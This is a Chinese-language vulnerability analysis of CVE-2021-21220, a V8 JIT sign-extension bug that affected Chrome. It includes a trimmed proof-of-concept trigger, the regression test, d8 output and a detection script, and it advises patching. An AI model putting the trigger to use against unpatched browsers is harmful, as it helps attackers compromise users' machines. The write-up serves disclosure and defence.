  

## 前言

​

CVE-2021-21220 是4月13号在 github 上公开的一个半 0day v8 引擎 JIT 模块漏洞。由于当时最新stable版本
(89.0.4389.114) 和 beta 版本 (90.0.4430.70) 的 Chrome 均未集成修复后的 V8
版本，所以该漏洞可以影响最新版本的 Chrome，当然，也影响基于 V8 的其它广泛使用的浏览器。

目前最新版本的 Chrome 已修复该漏洞，建议大家尽快更新 Chrome 浏览器。

  

## 漏洞分析

  

拿到PoC之后，首先进行简单的分析和精简，方便之后的调试分析。

    
    
    var _arr = new Uint32Array([2**31]);function foo(a) {var x = 1;x = (_arr[0] ^ 0) + 1;x = Math.abs(x);x -= 2147483647;x = Math.max(x, 0);x -= 1;if(x==-1) x = 0;var arr = new Array(x);arr.shift();var cor = [1.1, 1.2, 1.3];return [arr, cor];}​for(var i=0;i<0x3000;++i)foo(true);​var x = foo(false);var arr = x[0];var cor = x[1];

  

对 jit 比较熟悉的同学，很容易就可以发现 foo 函数是被优化的函数。foo 函数的主要功能是：1、对变量 x
进行多种基本操作；2、涉及数组的相关操作。仔细看一下数组这部分，它主要依赖于变量 x 的值。

    
    
    var _arr = new Uint32Array([2**31]);//2**31function foo(a) {var x = 1;x = (_arr[0] ^ 0) + 1;// (2**31)^0+1x = Math.abs(x);x -= 2147483647;//2**31-1=2147483647x = Math.max(x, 0);x -= 1;if(x==-1) x = 0;return x}print(foo(false));for(var i=0;i<0x3000;++i)foo(true);var x = foo(false);print(x)

  

去掉 array 数组那部分的精简，运行poc，结合输出的结果，说明我们的推断是正确的。

    
    
    d8 poc.js 01

  

进一步分析发现，变量 x 的值和 2**31(2147483648) 有很大关系。有符号的int32 整数范围
[-2147483648~2147483647]，在这个地方进行加减操作，在64位平台下很容易发生 int32 和 int64
之间的相互转换。事实上我们发现 v8 团队提交的一个 commit 修复链接 [compiler][x64] Fix bug in
InstructionSelector::ChangeInt32ToInt64，恰好是这个 bug 的
patch。这个commit中包含了对应的回归测试用例。为了调试方便，我们使用该测试用例。

    
    
    const arr = new Uint32Array([2**31]);function foo() {return (arr[0] ^ 0) + 1;}%PrepareFunctionForOptimization(foo);print(foo());%OptimizeFunctionOnNextCall(foo);print(foo());

执行

    
    
    d8 poc.js --allow-natives-syntax-2147483647  //runtime2147483649   //jit

  

arr[0]= 2**31(2147483648)；arr[0] ^ 0 = -2147483648在32位有符号的情况下为0x8000 0000，而
arr[0] 在32位无符号的情况下也为 0x8000 0000，之后执行加1：在 runtime 阶段，-2147483648+1=0xFFFF FFFF
8000 0001 = -2147483647没有问题；而 jit 阶段，错误地将32位无符号0x8000 0000,扩展为64位0x0000 0000
8000 0000，然后加1得到0x0000 0000 8000 0001 = 2147483649。

  

![](https://image.3001.net/images/20210414/1618391971_6076b3a3656959715f850.png!small)

  

结合对应的 patch 代码和注释，ChangeInt32ToInt64的输入是一个有符号的32位整数，所以任何时候都应该做符号扩展。

![](https://image.3001.net/images/20210414/1618391983_6076b3af32aa93a411c67.png!small)

  

最后我们来看一下 jit 生成的代码，这里通过 | mov ecx,dword ptr [rcx]|，错误地丢失了符号。而在 fix 之后的 jit
代码中通过 | movsxd rcx,dword ptr [rcx]| 正确地带符号扩展 rcx。

JIT代码：

![](https://image.3001.net/images/20210414/1618392092_6076b41cef8664779ee48.jpg!small)

修复 JIT代码：

![](https://image.3001.net/images/20210414/1618392106_6076b42a204c947183263.jpg!small)

## 验证脚本

  

    
    
    var _arr = new Uint32Array([2**31]);​function foo(a) {var x = 1;x = (_arr[0] ^ 0) + 1;x = Math.abs(x);x -= 2147483647;x = Math.max(x, 0);x -= 1;if(x==-1) x = 0;var arr = new Array(x);return arr}​for(var i=0;i<0x3000;++i)foo(true);​var x = foo(false);if(x.length){alert("vuln is exist")}​

  

![](https://image.3001.net/images/20210414/1618391996_6076b3bc519d92d927430.png!small)

  

## 参考

  

  * https://github.com/r4j0x00/exploits/tree/master/chrome-0day

  * https://chromium-review.googlesource.com/c/v8/v8/+/2820971

  

就在今天，奇安信代码安全实验室帮助微软修复严重的远程内核级漏洞，获官方致谢。

  

奇安信开源卫士20210414.659版本已支持对该漏洞的检测。

  

  

题图：Pixabay License

  

 **本文由奇安信代码卫士原创出品。转载请注明“转自奇安信代码卫士 https://codesafe.qianxin.com”。**

  

  

